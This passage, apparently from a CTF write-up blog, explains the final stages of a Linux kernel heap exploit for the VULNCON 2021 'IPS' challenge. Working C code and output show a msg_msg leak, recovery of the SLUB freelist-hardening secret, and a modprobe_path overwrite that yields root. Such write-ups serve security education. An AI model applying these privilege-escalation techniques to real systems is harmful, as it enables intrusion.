+  <span class="k">if</span> <span class="p">((</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">offset</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">offset</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="n">chunks</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">address</span> <span class="o">=</span> <span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">next</span><span class="p">;</span>
+
+    <span class="c1">// Calculate msg_msg address relative to current chunk</span>
+    <span class="n">msg_msg_address</span> <span class="o">=</span> <span class="n">chunks</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">address</span> <span class="o">-</span> <span class="n">chunks</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">offset</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>I also calculated the address of our <code class="language-plaintext highlighter-rouge">msg_msg</code> struct itself (which will be at the top of our leak, since we’re just reading from there), which we’ll need later on.</p>
+
+<p>If everything goes well and we find out the addresses of two chunks with this, we can continue</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Found chunks
+---------------------------------------------------------------------------------
+Chunk [ 0] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 1] - Address:                  0 / Next: 0xffff888006ebce80 / Offset: 0x660
+Chunk [ 2] - Address: 0xffff888006ebce80 / Next: 0xffff888006ebc480 / Offset: 0x860
+Chunk [ 3] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 4] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 5] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 6] - Address:                  0 / Next: 0xffff888006ebc280 / Offset: 0x3e0
+Chunk [ 7] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 8] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 9] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [10] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [11] - Address:                  0 / Next: 0xffff888006ebc780 / Offset: 0x5e0
+Chunk [12] - Address: 0xffff888006ebc780 / Next: 0xffff888006ebc080 / Offset: 0x160
+Chunk [13] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [14] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [15] - Address:                  0 / Next:                  0 / Offset: 0x960
+---------------------------------------------------------------------------------</code></pre></figure>
+
+<p>Looks good. If we now free some chunks, and check how they look like, we’ll see that for hardening, they moved the <code class="language-plaintext highlighter-rouge">next</code> pointers inside the chunk and also obfuscated them, so they cannot be overwritten that easily.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888006ebc700:	0x0000000000000000	0x0000000000000000 &lt;= free chunk
+0xffff888006ebc710:	0x0000000000000000	0x0000000000000000
+0xffff888006ebc720:	0x0000000000000000	0x0000000000000000
+0xffff888006ebc730:	0x0000000000000000	0x0000000000000000
+0xffff888006ebc740:	0x8125c01da3069e8f	0x0000000000000000 &lt;= obfuscated freelist ptr
+0xffff888006ebc750:	0x0000000000000000	0x0000000000000000
+0xffff888006ebc760:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Checking <code class="language-plaintext highlighter-rouge">freelist_ptr</code> for kernel <a href="https://elixir.bootlin.com/linux/v5.14.16/source/mm/slub.c#L262">v5.14.16</a> shows, how it’s calculated.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/*
+ * Returns freelist pointer (ptr). With hardening, this is obfuscated
+ * with an XOR of the address where the pointer is held and a per-cache
+ * random number.
+ */</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">freelist_ptr</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">kmem_cache</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span>
+				 <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptr_addr</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="cp">#ifdef CONFIG_SLAB_FREELIST_HARDENED
+</span>	<span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span> <span class="o">^</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">random</span> <span class="o">^</span> <span class="n">swab</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_addr</span><span class="p">)));</span>
+<span class="cp">#else
+</span>	<span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
+<span class="cp">#endif
+</span><span class="p">}</span></code></pre></figure>
+
+<p>This means, the address of the next free chunk (<code class="language-plaintext highlighter-rouge">ptr</code>) is xored with a secret value <code class="language-plaintext highlighter-rouge">s-&gt;random</code> and then xored with the address, where the freelist pointer is stored (<code class="language-plaintext highlighter-rouge">ptr_addr</code>). What gave me some headaches while writing the exploit was, that there’s a new addition in freelist pointer hardening, which was added some time ago.</p>
+
+<p>The address of the obfuscated pointer is <code class="language-plaintext highlighter-rouge">swab</code>ed (which means effectively all bytes are reversed), which resulted in all my calculated addresses being “a bit off”.</p>
+
+<p>But when checking the exact code for 5.14.16 it became more clear.</p>
+
+<p>So, to be able to create our own obfuscated pointer, which will point to an arbitrary address, we need to know, where the pointer will be stored (<code class="language-plaintext highlighter-rouge">ptr_addr</code>), which we can calculate from our leaks. We also need to know which will be the next free chunk, which we can control by freeing two chunks (so the next allocated chunks will be those freed chunks in reverse order) and <code class="language-plaintext highlighter-rouge">s-&gt;random</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">obfuscated = next_free ^ s-&gt;random ^ swab(ptr_addr)
+
+=&gt; s-&gt;random = next_free ^ swab(ptr_addr) ^ obfuscated</code></pre></figure>
+
+<p>Since we can get all the information except <code class="language-plaintext highlighter-rouge">s-&gt;random</code> from our leaks, we can calculate <code class="language-plaintext highlighter-rouge">s-&gt;random</code>, which will be the same for every slab/slub region.</p>
+
+<p>To do this, we’ll first need to prepare another leak and free 2 chunks, for which we know the address.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Stage3 : Allocate another msg_msg and free two known chunks</span>
+<span class="kt">char</span> <span class="n">msg_payload</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="kt">int</span> <span class="n">qid</span> <span class="o">=</span> <span class="n">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mo">0644</span> <span class="o">|</span> <span class="n">IPC_CREAT</span><span class="p">);</span>
+
+<span class="n">msg_alloc</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">msg_payload</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">freed_addresses</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">cur_free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="c1">// Free two chunks with known offset and address</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">address</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">offset</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">removechunk</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+    <span class="n">freed_addresses</span><span class="p">[</span><span class="n">cur_free</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">cur_free</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">cur_free</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Didn't find enough chunks for heap guard leak</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>We can now again corrupt the <code class="language-plaintext highlighter-rouge">msg_msg</code> and retrieve the obfuscated pointers from the just freed chunks. Since we know the order, in which they were freed and the addresses from both chunks, we know <code class="language-plaintext highlighter-rouge">next_free</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">bswap</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">asm</span><span class="p">(</span>
+        <span class="s">"bswap %1;"</span>
+        <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">val</span><span class="p">)</span>
+        <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">val</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="p">...</span>
+
+<span class="c1">// Stage4 : Corrupt msg_msg again to leak known free chunk heap guards and calculate secret</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">msg_payload</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">msg_payload</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
+<span class="n">msg_payload</span><span class="p">[</span><span class="mh">0x12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">msg_payload</span><span class="p">);</span>
+
+<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">msg_payload</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">heap_guard</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">msg_payload</span> <span class="o">+</span> <span class="n">chunks</span><span class="p">[</span><span class="n">freed_addresses</span><span class="p">[</span><span class="mi">1</span><span class="p">]].</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">));</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">next_free</span> <span class="o">=</span> <span class="n">chunks</span><span class="p">[</span><span class="n">freed_addresses</span><span class="p">[</span><span class="mi">0</span><span class="p">]].</span><span class="n">address</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptr_addr</span> <span class="o">=</span> <span class="n">chunks</span><span class="p">[</span><span class="n">freed_addresses</span><span class="p">[</span><span class="mi">1</span><span class="p">]].</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span>
+
+<span class="n">slab_random</span> <span class="o">=</span> <span class="n">heap_guard</span> <span class="o">^</span> <span class="n">next_free</span> <span class="o">^</span> <span class="n">bswap</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">);</span></code></pre></figure>
+
+<p>By knowing the secret, we can now finally overwrite the freelist ptr and allocate a chunk anywhere.</p>
+
+<p>Since <code class="language-plaintext highlighter-rouge">modprobe_path</code> was available in that challenge, it’s the easiest to just overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code> and trigger a flag copy.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">kernel_base</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">slab_random</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">msg_msg_address</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">);</span>
+  <span class="n">ptr</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="mh">0x32</span><span class="p">;</span>
+  <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">modprobe_path</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">^</span> <span class="n">slab_random</span> <span class="o">^</span> <span class="n">bswap</span><span class="p">(</span><span class="n">msg_msg_address</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">);</span>
+
+  <span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">,</span> <span class="s">"/home/user/copy.sh"</span><span class="p">);</span>
+
+  <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+  <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>  <span class="c1">// overwrite modprobe_path</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Didn't find all needed leaks</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"Trigger modprobe_path exploit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"./dummy"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"cat flag"</span><span class="p">);</span></code></pre></figure>
+
+<p>Since the remote server was already shut down, I could only execute it in my local environment and retrieve the “fake flag”…</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Prepare modprobe_path exploit
+[+] Create msg queue
+[+] Fillup complete storage
+[+] Create uaf copy
+[+] Create msg_msg in uaf chunk
+[+] Corrup msg_msg to leak followup data
+[+] Receive msg_msg for leaks
+
+Found chunks
+---------------------------------------------------------------------------------
+Chunk [ 0] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 1] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 2] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 3] - Address:                  0 / Next: 0xffffa24d04eb5180 / Offset: 0x7e0
+Chunk [ 4] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 5] - Address:                  0 / Next: 0xffffa24d04eb5b00 / Offset:  0x60
+Chunk [ 6] - Address: 0xffffa24d04eb5b00 / Next: 0xffffa24d04eb5700 / Offset: 0x360
+Chunk [ 7] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [ 8] - Address:                  0 / Next: 0xffffa24d04eb5500 / Offset: 0x760
+Chunk [ 9] - Address:                  0 / Next:                  0 / Offset:     0
+Chunk [10] - Address:                  0 / Next: 0xffffa24d04eb5b80 / Offset: 0x160
+Chunk [11] - Address: 0xffffa24d04eb5b80 / Next: 0xffffa24d04eb5d00 / Offset: 0x3e0
+Chunk [12] - Address: 0xffffa24d04eb5d00 / Next: 0xffffa24d04eb5d80 / Offset: 0x560
+Chunk [13] - Address: 0xffffa24d04eb5d80 / Next: 0xffffa24d04eb5e00 / Offset: 0x5e0
+Chunk [14] - Address: 0xffffa24d04eb5e00 / Next: 0xffffa24d04eb5680 / Offset: 0x660
+Chunk [15] - Address:                  0 / Next:                  0 / Offset:     0
+---------------------------------------------------------------------------------
+
+[+] Kernel base   : 0xffffffff8ea00000
+[+] msg_msg addr  : 0xffffa24d04eb5780
+[+] s-&gt;random     : 0x3e1da39b2565ae70
+[+] modprobe_path : 0xffffffff8fe4fa20
+Trigger modprobe_path exploit
+./dummy: line 1: \xff\xff\xff\xff: not found
+VULNCON{r00t_f4k3_fl4g}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=VULNCON CTF 2021 - IPS&amp;url=https://kileak.github.io/ctf/2021/vulncon-ips/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/vulncon-ips/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/vulncon-ips';
+        var disqus_title = 'VULNCON CTF 2021 - IPS';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/vulncon-ips';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
